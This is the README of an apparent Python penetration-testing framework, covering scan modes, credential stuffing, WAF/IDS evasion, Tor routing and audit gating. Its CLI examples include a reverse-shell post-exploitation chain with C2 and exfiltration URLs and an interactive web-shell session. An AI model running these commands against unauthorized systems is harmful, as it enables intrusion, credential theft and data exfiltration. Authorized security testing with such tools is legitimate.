# Athena Security Suite

> Athena () is an asynchronous, Python 3 penetration-testing and security-audit framework that automates the full PTES assessment lifecycle: **discovery → vulnerability scanning → credential testing → service enumeration → CVE mapping → reporting**, with optional post-exploitation, evasion, plugins, and compliance logging.

**Use responsibly.** Only scan systems you own or are explicitly authorized to test. Athena has built-in safe-mode and authorization gates, but you are responsible for what you point it at.

---

## Table of Contents

1. [What it does](#what-it-does)
2. [Architecture / how it functions](#architecture--how-it-functions)
3. [The scan workflow](#the-scan-workflow)
4. [Installation](#installation)
5. [Configuration](#configuration)
6. [Usage modes](#usage-modes)
7. [CLI reference](#cli-reference)
8. [Pipeline orchestration](#pipeline-orchestration)
9. [Operator control & preflight](#operator-control--preflight)
10. [Post-exploitation](#post-exploitation)
11. [AI Integration](#ai-integration)
12. [Finding Correlation](#finding-correlation)
13. [Rate Limiting](#rate-limiting)
14. [Plugins](#plugins)
15. [Reports & logs](#reports--logs)
16. [Logging & auditability](#logging--auditability)
17. [REST API server](#rest-api-server)
18. [What is missing / known gaps](#what-is-missing--known-gaps)
19. [Project layout](#project-layout)
20. [Development](#development)

---

## What it does

Athena runs a complete automated penetration test against one or many targets (hostnames, IPs, IP ranges, CIDR blocks) and produces professional audit reports. It does the following out of the box:

| Capability | Details |
|---|---|
| **Web discovery / recon** | URL crawling, recursive content discovery, subdomain brute-force, directory enumeration, robots/.well-known/sensitive-endpoint discovery, secret-leakage detection |
| **Network scanning** | TCP connect, SYN (stealth), UDP, ACK, FIN, NULL, XMAS scans; top-100/1000 or custom port ranges; rate limiting, jitter, concurrency control |
| **Fingerprinting** | Technology detection (headers, cookies, JS libraries, content), OS detection, DNS record analysis (MX/SPF/DKIM/DMARC/NS), TLS certificate inspection |
| **Vulnerability scanning** | 30+ checks: SQLi (error/time/union/boolean), XSS (reflected/stored/DOM), command injection, LFI/path traversal, SSRF, SSTI, XXE, NoSQL/LDAP/XPath injection, CSRF, CORS, JWT, cookie security, GraphQL introspection, prototype pollution, host-header injection, HTTP smuggling, cache poisoning, parameter pollution, race conditions, subdomain takeover, default credentials, security headers, API hardening, and more |
| **Credential testing** | Login-form bruteforcing and default-credential checks against FTP, SSH, MySQL, PostgreSQL, MSSQL, Redis, Telnet; credential stuffing with cookie seeding, CSRF auto-harvest, adaptive backoff, and AI-powered credential ranking |
| **Service enumeration** | SMB (445), SNMP (161), SMTP (25), POP3 (110/995), IMAP (143/993) |
| **CVE mapping** | Fingerprinted technology versions → CVE database lookup, CVSS scoring, exploit availability |
| **Reporting** | HTML (styled security-audit report with severity cards/charts), JSON, CSV, PDF (via ReportLab/WeasyPrint) |
| **Post-exploitation** | Foothold → enumeration → privilege escalation → lateral movement → data collection → persistence → cleanup chain, with reverse/bind/web shells and persistent sessions |
| **Evasion** | Stealth timing, random user agents, noise headers, proxy support, Tor routing |
| **WAF Detection & Evasion** | ~90 WAF fingerprints (Cloudflare, Akamai, AWS WAF, ModSecurity, Sucuri, Incapsula, Imperva, F5, FortiWeb, Barracuda, etc.), active challenge probes, deterministic signature-bypass tamper transforms |
| **Compliance** | PCI-DSS and GDPR audit event logging (JSON-lines audit trail) |
| **Logging & auditability** | Structured security-operation events: operator, engagement, target, module, action, timestamp, result, authorization & scope decisions, evidence reference |
| **AI Integration** | Multi-provider LLM analysis (Gemini/Groq/DeepSeek) with automatic failover for finding correlation, prioritization, attack-path reasoning, and report generation |
| **Finding Correlation** | Cross-module deduplication, relationship detection (duplicate/related/causal), impact aggregation |
| **Rate Limiting** | Per-engagement rate limiting with sliding window, burst control, violation tracking |
| **Pipeline Orchestration** | 11-stage PTES-aligned pipeline (engagement → reporting), independently runnable stages, failure isolation, structured states |
| **Operator Control** | Fail-closed operation gate: authorization, scope proof, technique gating, confirmation, audit, rate limits, preflight explanations |
| **Verified Cleanup** | Temporary-artifact registry with verified removal (scrubbing, failure isolation, audit trail) |

---

## Architecture / how it functions

```
athena.py                       ← CLI entry point (argparse), scan orchestrator, state/resume
├── modules/discovery.py        ← recon: crawling, subdomains, ports, fingerprinting, DNS/TLS
├── modules/vulnerability_scanner.py ← 30+ vulnerability test suite (aiohttp)
├── modules/bruteforce.py       ← login-form + service credential testing
├── modules/protocol_scanner.py ← SMB / SNMP / SMTP enumeration + ServiceBruteforcer
├── modules/cve_mapper.py       ← tech version → CVE lookup + CVSS
├── modules/reporting.py        ← HTML/JSON/CSV/PDF report generation
├── modules/exploitation.py     ← SQLi/XSS/command-injection exploit module (used by chain)
├── modules/os_detector.py      ← OS fingerprinting
├── modules/evasion.py          ← EvasionEngine: proxies, Tor, jitter, UA rotation
├── modules/framework_config.py ← env/.env-driven config + presets (stealth/balanced/…)
├── modules/payload_manager.py  ← payload library + WAF-bypass loading (config/payloads.json)
├── modules/plugin_system.py    ← BasePlugin ABC + PluginLoader auto-discovery
├── modules/operations_guide.py ← PTES methodology guide (--guide)
├── modules/logging_config.py   ← console logging + PCI/GDPR audit logger
├── modules/ai_integration.py   ← Multi-provider LLM: correlation, prioritization, attack paths, reports (failover)
├── modules/finding_correlation.py ← Cross-module dedup, relationship detection, impact aggregation
├── modules/rate_limiter.py     ← Per-engagement rate limiting, burst control, violation tracking
├── modules/orchestration.py    ← 11-stage pipeline: StageState, StructuredError, PipelineOrchestrator
├── modules/operation_control.py← OperationGate: preflight plans, authorization, scope/technique gating
├── modules/cleanup_manager.py  ← Verified cleanup of temporary artifacts (scrub, audit, isolation)
└── modules/post_exploitation/  ← orchestrator + 7-phase post-exploitation chain
```

**How it functions:**

- **Entry point** — `athena.py` parses CLI args, applies the operational profile via `load_config()`, resolves targets (hostname → `https://`, IP ranges/CIDR expansion, target files), then runs an async scan session.
- **Phases are pipelined** — each phase consumes output from the previous one (e.g., discovery feeds discovered URLs to the scanner, open ports to the bruteforcer and enumerator, fingerprint results to the CVE mapper).
- **Everything is async** — built on `asyncio` + `aiohttp`, so a single event loop drives concurrent requests with rate limiting and jitter for stealth.
- **Configuration** — class-level attributes on `FrameworkConfig` read from environment variables / `.env` (priority: env var → `.env` → coded default). No secrets live in code.
- **State & resume** — `ScanState` persists progress to `.athena_scan_state.json`; interrupted scans can be resumed with `--resume`.
- **Safety gates** — `SAFE_MODE` (default on) blocks destructive actions; the authorization file (`ATHENA_AUTHORIZATION.txt`) is required for aggressive features and must be refreshed hourly.
- **Orchestration** — `PipelineOrchestrator` runs stages with isolation, timeout, cancellation and artifact hand-off; every stage can also be run alone (`--stage`). Failures are structured (`StructuredError` codes) and never abort unrelated stages.
- **Fail-closed operator control** — `OperationGate` explains every sensitive operation (WHAT / WHY / TARGET / IN SCOPE / EXPECTED EVIDENCE) before it runs, and denies anything not provably in scope, authorized, and within the engagement's allowed techniques.
- **Verified cleanup** — every temporary artifact is registered with `CleanupManager`, removed afterwards, and removal is only reported `verified` when a follow-up check confirms the artifact is gone.

---

## The scan workflow

A full scan runs these phases in order (`--mode full`):

```
PHASE 1: DISCOVERY & RECONNAISSANCE
  ├─ URL crawl & recursive content discovery
  ├─ Email harvesting
  ├─ Subdomain enumeration (brute-force)
  ├─ Port scanning (default top-1000 TCP; --scan/--ports control type & range)
  ├─ Technology / OS fingerprinting
  ├─ DNS record analysis
  ├─ TLS certificate inspection
  └─ Directory / sensitive-endpoint / secret-leakage checks

PHASE 2: VULNERABILITY SCANNING
  ├─ SQLi, XSS, command injection, LFI, SSRF, SSTI, XXE, …
  ├─ CSRF, CORS, JWT, cookie & security-header checks
  └─ API, GraphQL, misconfiguration & exposure tests

PHASE 3: BRUTEFORCING & AUTH TESTING
  ├─ Login-form bruteforce
  └─ Default credentials on FTP/SSH/MySQL/PostgreSQL/MSSQL/Redis/Telnet

PHASE: SERVICE ENUMERATION
  └─ SMB / SNMP / SMTP enumeration on discovered ports

PHASE: CVE MAPPING
  └─ Fingerprinted technologies + versions → CVEs (CVSS, exploits)

PHASE: REPORTING
  └─ HTML / JSON / CSV / PDF report written to report_<target>.*
```

The full PTES methodology guide (pre-engagement through reporting) is bundled and can be shown with `python athena.py --guide` or exported to JSON with `--guide --export out.json`.

---

## Installation

Requires **Python 3.10+**.

```powershell
# Windows
python -m venv .venv
.\.venv\Scripts\Activate.ps1
pip install -r requirements.txt
```

```bash
# Linux / macOS
python3 -m venv .venv
source .venv/bin/activate
pip install -r requirements.txt
```

Optional extras: `tqdm` for progress bars (falls back to plain text if missing). A `run.bat` wrapper is included for Windows (`run.bat <target> <mode>`).

Verify:
```powershell
python athena.py --help
python athena.py --list-plugins
```

---

## Configuration

Copy `.env.example` to `.env` and adjust:

```powershell
Copy-Item .env.example .env
```

Key variables (all optional; sane defaults exist):

| Variable | Default | Purpose |
|---|---|---|
| `ATHENA_PROFILE` | `balanced` | Operational preset (`stealth`, `balanced`, `aggressive`, `debug`) |
| `ATHENA_SAFE_MODE` | `true` | Blocks destructive actions; disable only for authorized tests |
| `ATHENA_STEALTH` | `true` | Enables randomized delays / evasive behavior |
| `HTTP_TIMEOUT` / `HTTP_MAX_RETRIES` / `HTTP_MAX_CONNECTIONS` | 10 / 3 / 10 | HTTP tuning |
| `SCANNING_THREADS` / `DISCOVERY_THREADS` | 10 / 5 | Concurrency |
| `LOG_FILE` / `AUDIT_LOG_FILE` | `athena.log` / `athena_audit.log` | Log destinations |
| `PCI_AUDIT_ENABLED` / `GDPR_LOGGING_ENABLED` | `true` | Compliance audit events |
| `DEFAULT_WORDLIST` | `common_files.txt` | Directory-bruteforce wordlist (⚠️ file not shipped — see gaps) |

**Payloads & WAF bypass:** `config/payloads.json` holds WAF-bypass techniques and payload templates. Extend it or register payloads at runtime via `modules/payload_manager.py` (`payload_manager.register_payload(...)`, `payload_manager.load_custom_payloads('my.json')`).

---

## Usage modes

### 1. Scan modes (`-m` / `--mode`)

| Mode | Runs | Use case |
|---|---|---|
| `full` *(default)* | Discovery → vuln scan → bruteforce → enumeration → CVE mapping → report | Complete automated penetration test — end-to-end assessment from reconnaissance through reporting |
| `discovery` | Recon only (crawl, ports, fingerprint, emails) + service enumeration (SMB/SNMP/SMTP/POP3/IMAP) | Asset mapping, low-noise recon, attack-surface enumeration |
| `vuln` | Vulnerability scan only (30+ check categories) | Fast vulnerability check against known URLs — skips recon to focus on exploitable flaws |
| `bruteforce` | Discovery + credential testing (login-form bruteforce, default creds, credential stuffing) | Password/default-cred audit, authentication weakness assessment |
| `recon` | Discovery + bruteforce + enumeration + CVE mapping | Extended reconnaissance with CVE context — maps technology versions to known vulnerabilities |
| `all` | Everything including bruteforce (full pipeline) | Exhaustive assessment — runs every module with no shortcuts |

#### Scan mode examples with `example.com`

```powershell
# Full assessment — runs every phase end-to-end
python athena.py -t example.com -m full

# Full assessment with stealth profile — slow, evasive, IDS/WAF-friendly
python athena.py -t example.com -m full -p stealth

# Discovery only — map the attack surface without triggering alerts
python athena.py -t example.com -m discovery -p stealth

# Vulnerability scan only — skip recon, test known endpoints for flaws
python athena.py -t example.com -m vuln -o html

# Bruteforce — test authentication strength with credential stuffing
python athena.py -t example.com -m bruteforce --creds-file wordlist.txt

# Recon with CVE context — enumerate services and map to known CVEs
python athena.py -t example.com -m recon -o json

# Exhaustive — everything enabled, multiple output formats
python athena.py -t example.com -m all -o all

# Stealth full scan — SYN scan, randomized delays, Tor routing
python athena.py -t example.com -m full -p stealth --scan syn --jitter 100 --tor

# Stealth discovery with custom ports — quiet recon on web ports only
python athena.py -t example.com -m discovery -p stealth --ports 80,443,8080,8443 --rate 100
```

### 2. Operational profiles (`-p` / `--profile`)

| Profile | Speed | Stealth | Use case |
|---|---|---|---|
| `stealth` | Slow | Maximum | Red-team engagements, IDS/WAF evasion, production environments where detection must be avoided |
| `balanced` | Moderate | Good | General assessments (default) — balances speed with noise reduction |
| `aggressive` | Fast | Minimal | Labs, CTFs, time-constrained tests, authorized internal audits |
| `debug` | Slow | None | Development / troubleshooting (max verbosity, all details logged) |

#### Stealth profile deep-dive

The `stealth` profile is Athena's most evasive mode. It applies:

- **Randomized timing** — jitter between every request to avoid pattern detection
- **Rate limiting** — strict packets-per-second caps to stay below IDS thresholds
- **User-agent rotation** — every request uses a different browser fingerprint
- **Noise headers** — decoy HTTP headers to blend with normal traffic
- **Proxy/Tor routing** — optional SOCKS5 proxy or Tor circuit rotation
- **WAF-aware probing** — detects WAF presence and applies tamper transforms automatically
- **SYN stealth scans** — half-open TCP scans that never complete the handshake

```powershell
# Maximum stealth — full assessment through Tor with SYN scan
python athena.py -t example.com -m full -p stealth --scan syn --tor --jitter 200

# Stealth discovery — low-and-slow asset mapping
python athena.py -t example.com -m discovery -p stealth --rate 50 --concurrent 5

# Stealth vuln scan — test for flaws without triggering WAF
python athena.py -t example.com -m vuln -p stealth --proxy socks5://127.0.0.1:9050
```

### 3. Scan engine options

- `--scan tcp_connect,syn,udp` — port-scan techniques
- `--ports 1-1000 | top100 | top1000 | all | 80,443,8080`
- `--rate N` — max packets/sec · `--concurrent N` — parallel connections · `--jitter N` — random delay ms
- `--proxy URL` or `--tor` — route traffic (Tor expects `socks5://127.0.0.1:9050`)

### 4. Output formats (`-o` / `--output`)

`html` *(default)*, `json`, `csv`, `pdf`, or `all`. Reports are written to `report_<target>.*` in the project root, or to a custom path with `--export <path>`.

### 5. Session control

- `--resume` — continue an interrupted scan from `.athena_scan_state.json`
- `--pause` — pause after each phase (press Enter to continue)

### 6. Operational guide

- `--guide` — interactive PTES guide · `--guide --export guide.json` — export as JSON

### 7. Post-exploitation (`--post*`)

See the [Post-exploitation](#post-exploitation) section below.

---

## CLI reference

```text
python athena.py -t TARGET -m MODE [options]
```

| Flag | Description |
|---|---|
| `-t, --target` | Target URL / IP / hostname (may be a CIDR or IP range) |
| `-f, --target-file` | File of targets, one per line (CIDR/range supported) |
| `-m, --mode` | `full` \| `discovery` \| `vuln` \| `bruteforce` \| `recon` \| `all` (numeric aliases: `1`=full, `2`=discovery, `3`=vuln, `4`=api) |
| `-p, --profile` | `stealth` \| `balanced` \| `aggressive` \| `debug` |
| `--unsafe` | Disable safe mode (authorized testing only) |
| `--api` / `--api-host` / `--api-port` | Start REST API server (see below) |
| `--scan` | `tcp_connect,syn,udp,ack,fin,null,xmas` (comma-separated) |
| `--ports` | `1-1000`, `top100`, `top1000`, `all`, or a list |
| `--rate`, `--concurrent`, `--jitter` | Engine tuning |
| `--proxy`, `--tor`, `--random-agent` | Evasion / routing |
| `--wordlist` | Custom wordlist file for directory/file enumeration |
| `--dir-depth` | Recursion depth into confirmed directories (default: 1, 0 disables) |
| `--creds-file` | Credential stuffing list (user:pass pairs, one per line) |
| `--cookie-file` | Seed cookies (Netscape format or name=value per line) before credential stuffing |
| `--ai-creds` | Re-rank credential stuffing pool with AI before replaying |
| `--stuffing-delay` | Fixed delay in seconds between credential stuffing attempts per form (default: 0.0) |
| `--max-attempts` | Hard cap on credential stuffing attempts per form (0 = unlimited) |
| `-v, --verbose` | DEBUG-level logging |
| `-o, --output` | `html` \| `json` \| `csv` \| `pdf` \| `all` |
| `--resume` / `--pause` | Session control |
| `--guide` / `--list-plugins` | Docs & extension tooling |
| `--export <path>` | Custom report / guide output path |
| `--list-stages` | List the 11 pipeline stages and their artifact contracts |
| `--stage <key>` | Run only the given pipeline stage(s) independently (repeatable) |
| `--preflight` | Explain each operation before executing (authorization, scope, expected evidence) |
| `--scope-file` / `--engagement-id` | Bind operations to an engagement (scope + allowed techniques) |

### Examples

```powershell
# Full assessment of a single target
python athena.py -t example.com -m full

# Discovery only, stealth profile, verbose
python athena.py -t example.com -m discovery -p stealth -v

# Vuln scan of a specific URL, HTML report
python athena.py -t https://example.com -m vuln -o html

# Advanced port scan: SYN + UDP on range, rate-limited with jitter
python athena.py -t example.com --scan syn,udp --ports 1-1000 --rate 500 --jitter 50

# Credential stuffing against discovered login forms
python athena.py -t example.com -m bruteforce --creds-file creds.txt --cookie-file cookies.txt

# AI-powered credential ranking before stuffing
python athena.py -t example.com -m bruteforce --creds-file creds.txt --ai-creds

# Aggressive directory enumeration with recursion
python athena.py -t example.com -m discovery --dir-depth 3

# WAF-aware scan — auto-detects WAF and applies tamper transforms
python athena.py -t example.com -m vuln -p stealth

# Multiple targets from a file, everything enabled, JSON output
python athena.py -f targets.txt -m all -o json

# CIDR block
python athena.py -t 10.0.0.0/24 -m full

# Resume an interrupted scan
python athena.py --resume

# Post-exploitation: reverse shell chain + C2/exfil
python athena.py -t example.com --post --post-shell reverse --c2-url https://c2.example --exfil-url https://exfil.example

# Post-exploitation: register a web shell and go interactive
python athena.py --post-shell web --post-web-url https://target/shell.php --post-interactive

# List the pipeline stages and their artifact contracts
python athena.py --list-stages

# Run one stage independently (no full pipeline)
python athena.py -t example.com --stage discovery

# Run a sub-chain of stages (repeatable flag)
python athena.py -t example.com --stage discovery --stage scanning --stage reporting

# Preflight: explain operations before executing (fail-closed gating)
python athena.py -t example.com --preflight
```

---

## Pipeline orchestration

The assessment pipeline (`modules/orchestration.py`) models the PTES lifecycle as **11 independently runnable stages**:

```
engagement → recon → enumeration → discovery → scanning → validation
          → initial_access → post_exploitation_assessment → attack_path_analysis
          → impact_assessment → reporting
```

Key concepts:

- **Stage states** — every stage ends in one of ten structured states: `queued`, `running`, `completed`, `failed`, `timeout`, `cancelled`, `blocked_by_scope`, `blocked_by_policy`, `requires_authorization`, `partial`.
- **Structured errors** — failures carry a stable `code` (e.g. `BLOCKED_BY_SCOPE`, `MISSING_DEPENDENCY`, `STAGE_TIMEOUT`) so callers can react without parsing text.
- **Failure isolation** — a failed stage never aborts the pipeline; unrelated stages keep running, and dependent stages are gated with `MISSING_DEPENDENCY` instead of crashing.
- **Artifact hand-off** — each stage declares `produces` / `requires` artifact keys; completed outputs are handed to later stages.
- **Independent execution** — any stage can be run alone via `--stage` (module-backed stages run real modules; the remaining stages are orchestration seams awaiting a module and fail with `STAGE_NOT_IMPLEMENTED` — see [known gaps](#what-is-missing--known-gaps)).

Programmatic usage:

```python
from modules.orchestration import PipelineOrchestrator, StructuredError

async def my_discovery():
    return {"urls": ["https://example.com"], "technologies": ["nginx"]}

orchestrator = PipelineOrchestrator(engagement_id="eng-1")
async def my_scan():
    raise StructuredError("SCANNER_DOWN", "scanner crashed")

results = await orchestrator.run_pipeline(
    {"discovery": my_discovery, "scanning": my_scan})
print(results["scanning"].state.value)      # "failed"
print(results["scanning"].error["code"])    # "SCANNER_DOWN"
print(orchestrator.report()["state_counts"])  # {"completed": 1, "failed": 1}
```

---

## Operator control & preflight

`modules/operation_control.py` provides **fail-closed operator control** over sensitive operations. Before anything runs, an operation is described by an `OperationPlan` and shown as a preflight explanation:

```
PREFLIGHT OPERATION EXPLANATION
  WHAT:              Validation (pipeline stage)
  WHY:               Deterministic confirmation of candidate findings with evidence.
  TARGET:            https://example.com
  TARGET IN SCOPE:   YES (in scope)
  EXPECTED EVIDENCE: validated_findings
  SCOPE REASON:      matches in-scope URL rule
  TECHNIQUE:         controlled_validation
  CONFIRMATION:      REQUIRED (operator decision)
```

The `OperationGate` then enforces, in order (first denial wins):

1. **Engagement exists & is active** — no engagement ⇒ denied (Athena fails closed).
2. **Scope proof** — the target must be provably in scope (reachability is never authorization).
3. **Technique gating** — the technique must be allowed by the engagement (allow/restrict lists).
4. **Confirmation** — techniques such as controlled validation, persistence, lateral assessment and cleanup require an explicit operator confirmation (`requires_authorization` otherwise).
5. **Rate limiting** — per engagement + operator.
6. **Audit** — every decision is written to the compliance audit log.

```python
from modules.operation_control import OperationGate

gate = OperationGate(engagement=engagement, operator="you", audit=audit_logger)
plan = gate.plan(
    action="Enumerate SMB shares", rationale="Authorized assessment",
    target="10.0.0.5", technique="recon",
    expected_evidence=["shares", "versions"])
print(gate.explain(plan))

outcome = await gate.execute(plan, my_async_fn, timeout_seconds=300)
print(outcome["state"])  # "completed" | "blocked_by_scope" | ...
```

## Verified cleanup

`modules/cleanup_manager.py` tracks every temporary artifact Athena creates and removes it afterwards with **verification**: removal is only reported `verified` when a follow-up check confirms the artifact is gone (or was never created). Cleanup failures are isolated (one stuck artifact does not block the rest), artifacts can be zero-filled before deletion (`scrub=True`), and every registration/removal is written to the audit log.

```python
from modules.cleanup_manager import CleanupManager

cleanup = CleanupManager(audit=audit_logger)
cleanup.register("/tmp/athena_evidence.bin", scrub=True)
report = cleanup.cleanup()          # never raises
assert report["verified"]           # False if anything remains
print(report["remaining"])
```

---

## Post-exploitation

The post-exploitation chain (`modules/post_exploitation/`) runs 7 ordered phases after a foothold:

```
FOOTHOLD → ENUMERATION → PRIVESC → LATERAL → DATA_COLLECTION → PERSISTENCE → CLEANUP
```

Key concepts:

- **Sessions** (`PostSession`) — abstract remote shells with `exec`/`upload`/`download` over a transport.
- **Shell types** — `reverse` (listener on your host), `bind`, or `web` (web-shell URL).
- **Transports** — reverse TCP, bind TCP, web shell, with bash/sh/cmd/PowerShell/Python/PHP/Perl/netcat languages.
- **Orchestrator** — configures C2/exfil endpoints, run phases automatically or step through manually (`--post-manual`), restrict (`--post-only`) or skip (`--post-skip`) phases.
- **Sessions persist** across runs (`session_mgr.save()`); list them with `--post-list-sessions`, interact with `--post-interactive`.

Flags:

| Flag | Description |
|---|---|
| `--post` | Run post-exploitation after scanning |
| `--post-shell` | `reverse` \| `bind` \| `web` |
| `--post-host` / `--post-port` | Listener host / port (default `0.0.0.0:4444`) |
| `--post-web-url` / `--post-web-param` / `--post-web-method` | Web-shell connection |
| `--post-manual` | Step through phases interactively |
| `--post-only` / `--post-skip` | Restrict / skip a single phase |
| `--post-list-sessions` | List saved sessions |
| `--post-interactive` | Open an interactive console |
| `--c2-url` / `--exfil-url` | C2 callback / exfiltration endpoints |

---

## AI Integration

Athena includes AI-powered analysis with **multi-provider support and automatic failover**: Gemini, Groq and DeepSeek. If the primary provider fails (network error, HTTP error, missing key), the call falls through to the next configured provider, and `last_provider` reports who answered. The AI integration provides:

- **Finding Correlation** — Identify duplicates, related findings, and causal relationships
- **Prioritization** — Rank findings by risk (severity, exploitability, asset criticality)
- **Attack Path Analysis** — Identify how findings connect into attack chains
- **Report Generation** — Generate executive summaries and technical narratives

### Configuration

Set any API key as an environment variable; the first configured provider wins:

```powershell
# Primary provider (Gemini)
[System.Environment]::SetEnvironmentVariable("GEMINI_API_KEY", "your-api-key", "User")

# Optional failover providers (tried in order: Gemini → Groq → DeepSeek)
$env:GROQ_API_KEY = "your-groq-key"
$env:DEEPSEEK_API_KEY = "your-deepseek-key"

# Force a specific provider (default: gemini | groq | deepseek)
$env:ATHENA_AI_PROVIDER = "groq"

# Optional: override the default model per provider
$env:ATHENA_AI_MODEL = "custom-model"
```

### Usage

```python
from modules.ai_integration import AIIntegration

ai = AIIntegration()  # resolves provider from ATHENA_AI_PROVIDER / configured keys

# Correlate findings
result = await ai.correlate_findings(findings, evidence)

# Prioritize by risk
prioritized = await ai.prioritize_findings(findings)

# Generate report narrative
narrative = await ai.ai_generate_report_narrative(engagement, findings, evidence)

# Which provider answered the last call?
print(ai.last_provider.value)   # "gemini" | "groq" | "deepseek"
```

### Design Principles

- **LLM is never the source of truth** — Deterministic tools and collected evidence remain authoritative
- **Graceful degradation** — All methods return empty results when no API key is configured; a failing provider is bypassed via failover, never fatal
- **Confidence scoring** — All AI statements include confidence levels and reasoning types

---

## Finding Correlation

The finding correlation module provides cross-module deduplication and relationship detection.

### Features

- **Deduplication** — Groups findings by normalized keys (title, asset, module, type)
- **Relationship Detection** — Identifies related findings, duplicates, and causal chains
- **Impact Aggregation** — Combines severity scores across related findings
- **Filtering** — Filter by severity, asset, module, or engagement

### Usage

```python
from modules.finding_correlation import FindingCorrelator

correlator = FindingCorrelator()

# Deduplicate findings
unique, duplicates = correlator.deduplicate_findings(findings)

# Detect relationships
relationships = correlator.detect_relationships(findings)

# Aggregate impact
aggregated = correlator.aggregate_impact(findings)
```

---

## Rate Limiting

Per-engagement rate limiting with sliding window algorithm.

### Features

- **Sliding Window** — Token bucket algorithm with configurable windows
- **Burst Control** — Limits burst requests per window
- **Per-Engagement Config** — Different limits for different engagements
- **Violation Tracking** — Tracks and reports rate limit violations

### Usage

```python
from modules.rate_limiter import RateLimiter, RateLimitConfig

limiter = RateLimiter(config=RateLimitConfig(
    max_requests=100,
    window_seconds=60,
    burst_limit=10,
))

# Check rate limit
result = limiter.check_limit(engagement_id="eng1", operator_id="user1")
if not result.allowed:
    print(f"Rate limited: {result.reason}")

# Get usage stats
stats = limiter.get_usage_stats(engagement_id="eng1")
```

---

## Plugins

Plugins extend the framework. `PluginLoader` auto-discovers any class subclassing `BasePlugin` in the `plugins/` directory. Shipped plugins:

- `dns_enum` — DNS enumeration
- `wordpress_scanner` — WordPress fingerprinting

```powershell
python athena.py --list-plugins
```

Programmatic usage:

```python
from modules.plugin_system import PluginLoader
loader = PluginLoader()
await loader.run_plugin('wordpress_scanner', 'https://example.com')
```

---

## Reports & logs

Each scan produces:
- `report_<target>.html` / `.json` / `.csv` / `.pdf` — the audit report
- `athena.log` — detailed operational log
- `athena_audit.log` — compliance audit trail (single-line JSON events per PCI-DSS/GDPR action)
- `post_exploit_<session>.json` — post-exploitation chain report

Report structure (`report_<target>.json`):

```json
{
  "target": "example.com",
  "timestamp": "...",
  "discovery": { "subdomains": [], "urls": [], "technologies": [], "ports": [], ... },
  "vulnerabilities": [ { "type": "...", "severity": "CRITICAL|HIGH|MEDIUM|LOW", "url": "...", "description": "..." } ],
  "bruteforce": { "web_logins": [], "service_creds": [], "default_creds": [] },
  "enumeration": { "smb": {}, "snmp": {}, "smtp": {} },
  "cve_mapping": [ { "technology": "...", "version": "...", "cves": [], "max_cvss": 9.8 } ]
}
```

The HTML report adds severity summary cards, a severity distribution bar, technology lists, per-vulnerability tables, remediation recommendations, and a compliance audit section.

---

## Logging & auditability

Every security-relevant action is auditable: sensitive modules emit **structured operation events** (one JSON line per event) to the dedicated audit trail (`athena_audit.log`), with all required accountability fields:

| Field | Meaning |
|---|---|
| `operator` | Human or service operator performing the action |
| `engagement_id` | Engagement the action belongs to |
| `target` | Resource acted upon (host, URL, stage key, artifact path) |
| `module` | Emitting module (`operation_control`, `orchestration`, `cleanup_manager`, `cli`, …) |
| `action` | Short action code (`OPERATION_DENIED`, `STAGE_RUN`, `ARTIFACT_CLEANUP`, `PIPELINE_START`, …) |
| `timestamp` | ISO-8601 UTC |
| `result` | Outcome (`COMPLETED`, `FAILED`, `DENIED`, `VERIFIED`, …) |
| `authorization_decision` | Gate outcome (`AUTHORIZED`, `DENIED`, `REQUIRES_AUTHORIZATION`, `PENDING`) |
| `scope_decision` | Scope gate outcome (`in_scope`, `blocked_by_scope`, `unverified`) |
| `evidence_ref` | Evidence / operation / artifact reference (operation plan id, produced artifacts, error code) |
| `details` | Free-text context |

Who emits what:

- **`OperationGate`** (`modules/operation_control.py`) — every authorization attempt, denial, confirmation request and completed/failed operation carries the engagement id, the authorization decision and the scope decision.
- **`PipelineOrchestrator`** (`modules/orchestration.py`) — every stage run (`STAGE_RUN`) records the stage key as target, the final stage state as result, the derived authorization/scope decisions, and the produced artifacts or error code as evidence.
- **`CleanupManager`** (`modules/cleanup_manager.py`) — artifact registration and verified cleanup events.
- **CLI pipeline runs** (`athena.py`) — `PIPELINE_START` / `PIPELINE_END` events bound to the resolved engagement.

The audit trail is readable back for inspection:

```python
from modules.logging_config import AuditLogger, audit_operation

audit = AuditLogger(audit_file='athena_audit.log')
trail = audit.read_trail(limit=50, action='STAGE_RUN')   # newest last
for event in trail:
    print(event['target'], event['result'],
          event['authorization_decision'], event['scope_decision'])
```

Modules emit through the `audit_operation` helper, which writes the full schema when the backend supports it (`log_operation`) and falls back to a compatible `log_action` event for legacy audit backends. Audit failures never break operations — recording is best-effort by design, and the audit logger never propagates to the root logger so compliance records cannot be filtered or swallowed.

---

## REST API server

Start the API server:

```powershell
python athena.py --api            # or python athena.py -m 4
```

Configuration is read from `.env`/env vars: `SERVER_HOST` (default `0.0.0.0`), `SERVER_PORT` (default `5000`), `HTTPS_ENABLED` (serves HTTPS when `cert.pem`+`key.pem` exist, otherwise falls back to HTTP), `REQUIRE_API_KEY` (default `true`), `ATHENA_API_KEY`, `MAX_TARGETS_PER_REQUEST` (default `10`), `RATE_LIMIT_SCAN` (default `5 per minute`).

Endpoints:

| Endpoint | Auth | Description |
|---|---|---|
| `GET /health` | No | Health / safe-mode / active-scan count |
| `GET /metrics` | No | Prometheus text metrics |
| `POST /scan` | `X-API-KEY` | Queue a background scan (`target` string/list, `mode` `1`/`2`/`3`) → `202` + `job_id` |
| `GET /scan/status/<job_id>` | `X-API-KEY` | Job status (`QUEUED`/`RUNNING`/`COMPLETE`/`FAILED`) |
| `POST /scan/url` | `X-API-KEY` | Synchronous single-URL vulnerability probe |
| `GET /jobs` | `X-API-KEY` | List in-process jobs |
| `GET /apidocs/` | No | Simple endpoint reference |

All responses include mandatory security headers; `/scan` and `/scan/url` are rate-limited per API key + IP.

---

## What is missing / known gaps

The following items are **documented but incomplete** in the current codebase:

1. **Directory-bruteforce wordlist not shipped.** `FrameworkConfig.DEFAULT_WORDLIST = 'common_files.txt'` but the file does not exist in the repo, so content discovery may fail silently.

2. **Chrome extension is untested against a real server.** `extension/` expects the Flask server on `http://127.0.0.1:5000` (now implemented — start it with `python athena.py --api`).

3. **Stale artifacts in the repo root.** Old `report_*`, `*.log` and `*.jsonl` artifacts were removed; `.gitignore` now covers `report_*.html`, `report_*.csv`, `report_*.pdf`, `*.jsonl`, `*.log` and all `.5`-suffixed variants so they can never be committed.

4. **Docs drift.** `docs/USER_GUIDE.md` and `docs/API_REFERENCE.md` describe API behavior that was implemented in the current codebase but should be verified against it (e.g. rate-limit values, `--api` defaults). `.env.example` still mixes unused API settings.

### Recently Added Features

